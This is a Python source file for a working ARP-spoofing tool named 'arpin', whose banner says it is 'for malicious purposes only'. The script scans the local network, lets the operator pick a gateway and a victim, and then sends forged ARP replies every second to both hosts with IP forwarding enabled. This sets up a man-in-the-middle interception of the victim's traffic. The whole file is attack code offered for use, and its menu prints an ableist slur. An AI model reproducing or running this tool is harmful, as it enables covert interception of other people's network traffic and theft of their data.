# arpin by Atropin
# for malicious purposes only


import getmac
import os
import ipaddress
import threading
from scapy.layers.inet import *
from scapy.layers.l2 import ARP,Ether
from scapy.all import *
from os import walk
import socket
import fcntl
import struct
import signal

class client: #network client
    def __init__(self, client_MAC, client_IP):
        self.client_MAC = client_MAC
        self.client_IP = client_IP

def handler(signum, frame): #triggers timeout for scan
   print("Scanning taking too long, and we found no clients. Are you sure you selected the right interface?")
   exit()
   raise Exception("Scanning timed out")

def get_ip_address(ifname): #gets IP address of an interface
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    return socket.inet_ntoa(fcntl.ioctl(
        s.fileno(),
        0x8915,  # SIOCGIFADDR
        struct.pack(b'256s', ifname[:15].encode())
    )[20:24])

def scan(): #scans the network
    subnet_mask = socket.inet_ntoa(fcntl.ioctl(socket.socket(socket.AF_INET, socket.SOCK_DGRAM), 35099, struct.pack(b'256s', iface.encode()))[20:24])
    my_ip = get_ip_address(iface)
    network = ipaddress.IPv4Network(my_ip+"/"+subnet_mask, strict=False)
    print("Scanning network "+str(network)+"...")
    target_ip = str(network)
    packet = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=target_ip) #ARP request for all clients on the network
    signal.signal(signal.SIGALRM, handler) #sets up timeout
    signal.alarm(10) #sets timeout to 10 seconds
    try: 
        result = srp(packet, timeout=3, verbose=0)[0] #gets ARP responses
    except Exception as exc: #if hasn't got any response in 10 seconds, throws exception
        print(exc)
    signal.alarm(0) #resets the timeout
    global clients  #all clients on a target network
    clients = []
    global client 
    for sent, received in result:
        c = client(received.hwsrc, received.psrc) #gets MAC and IP addresses of each client
        clients.append(c)
    i = 0
    for client in clients:
        i += 1            
        print(f"{'['+str(i)+']':<11} {client.client_MAC:17} {client.client_IP:>20}") #prints MAC and IP address of each client
    print("{:12}{:10}".format("["+str(i+1)+"]", "Exit"))
    default_gateway = input("\nSelect default gateway\n")
    if (int(default_gateway) == int(i+1))|int(default_gateway)==0: #if invadlid option is selected
        exit()
    global router_IP, router_MAC, choice
    router_IP = clients[int(default_gateway)-1].client_IP #sets router IP
    router_MAC = clients[int(default_gateway)-1].client_MAC #sets router MAC
    choice = input("\nSelect client to be attacked\n")
    if (int(choice) == int(i+1))|int(choice)==0: #if invalid option is selected
        exit()


def select_interface():
    f = [] #array to store interfaces
    print("")
    for (dirpath, dirnames, filenames) in walk("/sys/class/net"):
        f.extend(dirnames) #get a dirname for each interface
        break
    for x in range(len(f)):
        print("["+str(x+1)+"] "+f[x]) #print interfaces
    print("["+str(len(f)+1)+"] exit")
    global iface
    iface_num = input("\nSelect interface\n")
    if int(iface_num) == len(f)+1:
        exit()
    if (int(iface_num) > len(f)+1)|int(iface_num)==0:
        print("Retarded option detected\nQuitting...")
        exit()
    iface = f[int(iface_num)-1]

def validate():
    if os.path.isdir("/sys/class/net/"+iface) == False: #is selected interface does not exist
        print("\nInvalid interface. Type 'ifconfig' to list available interfaces\n")
        exit()
    else:
        pass


def createPackets(): #creates spoofed packets for target client and router
    global to_client
    mac = getmac.get_mac_address() #gets local MAC address
    to_client = Ether(dst=clients[int(choice)-1].client_MAC, src=mac)/ARP(op="is-at", psrc=router_IP, pdst=clients[int(choice)-1].client_IP, hwsrc=mac, hwdst=clients[int(choice)-1].client_MAC)
    global to_router
    to_router = Ether(dst=router_MAC, src=mac)/ARP(op="is-at", psrc=clients[int(choice)-1].client_IP, pdst=router_IP, hwsrc=mac,hwdst=router_MAC)


def launch():
    f = open("/proc/sys/net/ipv4/ip_forward", "w") #enable ip forwarding
    f.write("1")
    f.close()
    global t
    t = threading.Timer(1.0, launch)
    t.start()
    sendp(to_client, verbose=0)
    sendp(to_router, verbose=0)
    print("\nThe attack is running, press ENTER to stop\n")


def stop():
    f = open("/proc/sys/net/ipv4/ip_forward", "w") #disable ip forwarding
    f.write("0")
    f.close()
    input()
    print("\nThe attack has succesfully stopped!")
    t.cancel()


#--------------MAIN---------------#
print("Created by Atropin\n\nFor malicious purposes only!\n")
print("[1] Scan the network\n[2] Quit")
x = input("\n")
while True:
    if x == "1":
        select_interface()
        validate()
        scan()
        createPackets()
        launch()
        stop()
        break
    if x == "2":
        exit()
    else:
        print("Retarded option detected\nQuitting...")
        exit()
